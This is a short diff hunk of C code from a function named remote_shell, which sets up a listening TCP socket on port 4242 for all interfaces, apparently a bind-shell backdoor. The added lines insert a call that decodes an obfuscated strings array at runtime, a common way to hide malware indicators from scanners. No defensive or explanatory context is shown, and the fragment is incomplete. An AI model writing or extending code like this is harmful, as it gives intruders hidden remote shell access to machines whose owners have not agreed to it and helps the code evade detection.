@@ -46,6 +46,8 @@ remote_shell(char **env) {
     int server_fd = -1, client_fd = -1;
     const struct sockaddr_in address = {.sin_family = AF_INET, .sin_addr.s_addr = INADDR_ANY, .sin_port = htons(4242)};
 
+    decode_strings(strings, sizeof(strings) / sizeof(strings[0]));
+
     server_fd = socket(AF_INET, SOCK_STREAM, 0);
 
     if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == -1) {
